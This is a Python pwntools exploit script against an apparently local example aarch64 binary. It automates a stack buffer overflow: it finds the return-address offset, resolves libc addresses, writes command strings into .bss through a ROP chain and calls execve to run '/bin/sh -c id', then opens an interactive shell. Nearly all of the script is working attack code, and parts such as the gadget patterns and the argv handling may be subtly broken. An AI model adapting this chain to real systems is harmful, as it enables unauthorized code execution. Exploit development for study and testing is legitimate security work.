from pwn import *
import sys
import os

# def find_offset(binary_path):
#     """
#     Finds the offset to the return address by sending a cyclic pattern
#     and analyzing the core dump when the program crashes.
#     """
#     pattern = cyclic(500)
#     p = process(binary_path)
#     p.sendline(pattern)
#     p.wait_for_close()

#     core = p.corefile
#     if core.arch == 'aarch64':
#         pc_value = core.pc
#     else:
#         log.error("Unsupported architecture")
#         p.close()
#         sys.exit(1)

#     offset = cyclic_find(pc_value, alphabet='abcdefghijklmnopqrstuvwxyz')
#     log.info(f"Offset found at {offset} bytes")

#     # Clean up the core dump file
#     core_path = core.path
#     if os.path.exists(core_path):
#         os.remove(core_path)
#         log.info(f"Deleted core dump file: {core_path}")

#     return offset

def find_offset(binary_path):
    """
    Automatically finds the offset to the saved return address by sending a cyclic pattern.
    """
    # Generate a cyclic pattern of sufficient length
    pattern_length = 1000  # Adjust if necessary
    pattern = cyclic(pattern_length, n=8)  # n=8 for 64-bit architecture

    # Start the process
    p = process(binary_path)
    p.sendline(pattern)
    p.wait()  # Wait for the process to crash

    # Load the core dump
    core = Coredump('./core')
    if core.arch == 'aarch64':
        pc_value = core.pc
    else:
        log.error("Unsupported architecture")
        p.close()
        sys.exit(1)

    # Find the offset
    offset = cyclic_find(pc_value, n=8)
    log.info(f"Offset found at {offset} bytes")

    # Clean up the core dump file
    if os.path.exists('core'):
        os.remove('core')
        log.info("Deleted core dump file: ./core")

    return offset


def find_libc_addresses(elf, libc_path):
    """
    Finds the addresses of system() and "/bin/sh" in libc.
    """
    libc = ELF(libc_path)

    p = process(elf.path, stdin=PTY, stdout=PTY)

    initial_output = p.recvline(timeout=1)
    log.debug(f"Initial output: {initial_output}")

    libs = p.libs()
    log.debug(f"Loaded libraries: {libs}")

    # Find the libc base address
    libc_base = libs.get(libc.path)
    if libc_base is None:
        # Try to find libc in the loaded libraries by name
        for path, address in libs.items():
            if 'libc.so.6' in path:
                libc_base = address
                libc.path = path  # Update the libc path
                log.info(f"Found libc at {path}")
                break
        else:
            log.error("Could not find libc in process libraries.")
            p.close()
            sys.exit(1)

    libc.address = libc_base
    log.info(f"Libc base address: {hex(libc_base)}")

    # Find the addresses of system() and "/bin/sh" in libc
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    log.info(f"system() address: {hex(system_addr)}")
    log.info(f"/bin/sh address: {hex(bin_sh_addr)}")
    p.close()

    return system_addr, bin_sh_addr

def construct_payload(offset, elf, libc, cmd_args):
    """
    Constructs the exploit payload to call execve with arbitrary command-line arguments.
    """
    payload = b'A' * offset
    rop = ROP([elf, libc])

    # Choose a writable address in the .data section without null bytes
    data_section = elf.get_section_by_name('.bss')  # .bss is writable
    if data_section is None:
        log.error("Could not find .bss section")
        sys.exit(1)
    bss_addr = data_section.header.sh_addr
    if b'\x00' in p64(bss_addr):
        log.error("Chosen address contains null bytes. Adjust the address.")
        sys.exit(1)

    log.info(f"Using .bss section at address: {hex(bss_addr)}")

    # Build the ROP chain
    try:
        # Gadgets for setting up registers
        pop_x0 = rop.find_gadget(['pop x0', 'ret'])[0]
        pop_x1 = rop.find_gadget(['pop x1', 'ret'])[0]
        pop_x2 = rop.find_gadget(['pop x2', 'ret'])[0]
        pop_x3 = rop.find_gadget(['pop x3', 'ret'])[0]

        # Gadget to write to memory (e.g., 'str x1, [x0]; ret')
        str_x1_x0 = rop.find_gadget(['str x1, [x0]', 'ret'])[0]
    except Exception as e:
        log.error("Could not find required gadgets.")
        log.error(e)
        sys.exit(1)

    log.info("Found required gadgets.")

    # Prepare command-line arguments
    # Convert command arguments to bytes and append null terminators
    cmd_strings = [arg.encode() + b'\x00' for arg in cmd_args]
    cmd_lengths = [len(s) for s in cmd_strings]

    # Calculate addresses where each argument will be stored
    arg_addrs = [bss_addr + sum(cmd_lengths[:i]) for i in range(len(cmd_lengths))]

    # Check for null bytes in addresses
    for addr in arg_addrs:
        if b'\x00' in p64(addr):
            log.error(f"Address {hex(addr)} contains null bytes.")
            sys.exit(1)

    # Build ROP chain to write command-line arguments into memory
    for arg, addr in zip(cmd_strings, arg_addrs):
        for i in range(0, len(arg), 8):
            chunk = arg[i:i+8]
            # Pad chunk to 8 bytes
            chunk = chunk.ljust(8, b'\x00')
            # Write chunk to memory
            rop.raw([
                pop_x0, addr + i,    # Address to write to
                pop_x1, u64(chunk),  # Data to write
                str_x1_x0            # Perform the write
            ])

    # Set up arguments for execve
    rop.raw([
        pop_x0, arg_addrs[0],      # x0 = pointer to filename
        pop_x1, arg_addrs,         # x1 = pointer to argv (array of pointers)
        pop_x2, 0,                 # x2 = envp = NULL
        libc.symbols['execve']     # Call execve
    ])

    payload += rop.chain()
    log.info("Payload constructed")
    return payload

def deploy_exploit(binary_path, payload):
    """
    Deploys the exploit by sending the payload to the vulnerable program.
    """
    p = process(binary_path)
    p.sendline(payload)
    log.info("Payload sent. Interacting with the shell...")
    p.interactive()

def main():
    binary_path = '../examples/bin/vuln_program_1'
    libc_path = '/lib/aarch64-linux-gnu/libc.so.6'

    global elf
    elf = ELF(binary_path)
    libc = ELF(libc_path)

    # Find the offset to the return address
    offset = find_offset(binary_path)

    # Option 1: Generate ROP chain for execve with arbitrary arguments
    cmd_args = ['/bin/sh', '-c', 'id']  # Example command
    payload = construct_payload(offset, elf, libc, cmd_args)

    # Deploy the exploit
    deploy_exploit(binary_path, payload)

if __name__ == '__main__':
    context.log_level = 'debug'
    main()
